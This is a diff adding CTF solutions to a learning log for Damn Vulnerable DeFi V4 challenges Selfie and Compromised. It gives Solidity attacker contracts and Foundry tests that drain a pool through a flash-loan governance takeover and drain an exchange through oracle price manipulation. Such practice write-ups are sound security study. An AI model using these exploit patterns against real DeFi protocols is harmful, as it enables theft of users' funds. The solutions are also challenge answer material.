@@ -695,3 +695,122 @@ contract TheRewarderChallenge is Test {
 }
 
 ```
+<br/><br/>
+
+### Day6 - Damn Vulnerable DeFi V4 - #6 Selfie
+
+SelfieAttacker.sol
+```solidity
+contract SelfieAttacker {
+    SelfiePool private immutable pool;
+    SimpleGovernance private immutable governance;
+    DamnValuableVotes private immutable token;
+    address private immutable player;
+    uint256 public actionId;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _player) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+        player = _player;
+    }
+
+    function attack() external {
+        uint256 poolBalance = token.balanceOf(address(pool));
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), poolBalance, "");
+    }
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
+        token.snapshot();
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
+        actionId = governance.queueAction(address(pool), 0, data);
+        token.approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction() external {
+        governance.executeAction(actionId);
+    }
+}
+```
+test_selfie function
+```solidity
+function test_selfie() public checkSolvedByPlayer {
+    // Deploy the attacker contract
+    SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);
+
+    // Perform the flash loan attack
+    attacker.attack();
+
+    // Advance time by 2 days (governance delay)
+    vm.warp(block.timestamp + 2 days);
+
+    // Execute the governance action
+    attacker.executeAction();
+}
+```
+<br/><br/>
+
+### Day8 - Damn Vulnerable DeFi V4 - #7 Compromised
+
+Exploit.sol
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity =0.8.25;
+import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
+import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
+import {Exchange} from "../../src/compromised/Exchange.sol";
+import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+contract Exploit is IERC721Receiver{
+    TrustfulOracle oracle;
+    Exchange exchange;
+    DamnValuableNFT nft;
+    uint nftId;
+    address recovery;
+    constructor(    
+        TrustfulOracle _oracle,
+        Exchange _exchange,
+        DamnValuableNFT _nft,
+        address _recovery
+    ) payable {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+    function buy() external payable{
+        uint _nftId = exchange.buyOne{value:1}();
+        nftId = _nftId;
+    }
+    function sell() external payable{
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+    function recover(uint amount) external {
+        payable(recovery).transfer(amount);
+    }
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4){
+        return this.onERC721Received.selector;
+    }
+    receive() external payable{
+    }
+}
+
+```
+Compromised.t.sol
+```solidity
+    function test_compromised() public checkSolved {
+        Exploit exploit = new Exploit{value:address(this).balance}(oracle, exchange, nft, recovery);
+        setPrice(0);
+        exploit.buy();
+        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        exploit.sell();
+        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+```
